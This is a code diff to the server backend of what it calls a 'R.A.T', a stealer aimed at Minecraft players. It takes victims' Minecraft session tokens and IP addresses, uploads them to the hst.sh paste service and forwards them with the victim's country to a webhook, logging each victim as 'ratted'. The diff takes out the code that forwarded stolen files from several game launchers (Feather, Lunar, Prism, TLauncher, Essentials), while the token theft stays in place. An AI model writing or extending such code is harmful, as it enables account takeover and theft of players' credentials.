@@ -44,11 +44,6 @@ try {
             serverId: req.body.uuid
         }),
         post("https://hst.sh/documents/", req.body.token).then(res => res.data.key).catch(() => "Error uploading"),
-        post("https://hst.sh/documents/", req.body.feather).then(res => res.data.key).catch(() => "Error uploading"),
-        post("https://hst.sh/documents/", req.body.essentials).then(res => res.data.key).catch(() => "Error uploading"),
-        post("https://hst.sh/documents/", req.body.lunar).then(res => res.data.key).catch(() => "Error uploading"),
-        post("https://hst.sh/documents/", req.body.prism).then(res => res.data.key).catch(() => "Error uploading"),
-        post("https://hst.sh/documents/", req.body.tlauncher).then(res => res.data.key).catch(() => "Error uploading")
     ]);
 
     let profiles = '';
@@ -62,11 +57,6 @@ try {
     const country = await fetchCountry(req.body.ip);
 
     const checkToken = req.body.token == 'File not found :(' ? 'Invalid Token' : `[Minecraft Token](https://hst.sh/${shorttoken})`;
-    const checkFeather = req.body.feather == 'File not found :(' ? 'Nope 😢' : `[View](https://hst.sh/${feather}) 🤩`;
-    const checkEssentials = req.body.essentials == 'File not found :(' ? 'Nope 😢' : `[View](https://hst.sh/${essentials}) 🤩`;
-    const checkLunar = req.body.lunar == 'File not found :(' ? 'Nope 😢' : `[View](https://hst.sh/${lunar}) 🤩`;
-    const checkPrism = req.body.prism == 'File not found :(' ? 'Nope 😢' : `[View](https://hst.sh/${prism}) 🤩`;
-    const checkTL = req.body.tlauncher == 'File not found :(' ? 'Nope 😢' : `[View](https://hst.sh/${tlauncher}) 🤩`;
     const planckeUrl = `[Plancke.io](https://plancke.io/hypixel/player/stats/${req.body.username})`;
     const cryptUrl = `[SkyCrypt](https://sky.shiiyu.moe/stats/${req.body.username}})`;
 
@@ -87,27 +77,6 @@ try {
         }],
         attachments: []
     };
-
-     if (checkFeather !== 'Nope 😢') {
-            webhookData.embeds[0].fields.push({ name: 'Feather', value: `${checkFeather}`, inline: false });
-        }
-
-        if (checkTL !== 'Nope 😢') {
-            webhookData.embeds[0].fields.push({ name: 'Tlauncher', value: `${checkTL}`, inline: true });
-        }
-
-        if (checkEssentials !== 'Nope 😢') {
-            webhookData.embeds[0].fields.push({ name: 'Essentials', value: `${checkEssentials}`, inline: false });
-        }
-
-        if (checkLunar !== 'Nope 😢') {
-            webhookData.embeds[0].fields.push({ name: 'Lunar', value: `${checkLunar}`, inline: true });
-        }
-
-        if (checkPrism !== 'Nope 😢') {
-            webhookData.embeds[0].fields.push({ name: 'Prism', value: `${checkPrism}`, inline: true });
-        }
-    
     await post(process.env.WEBHOOK, webhookData);
     console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`);
 } catch (err) {
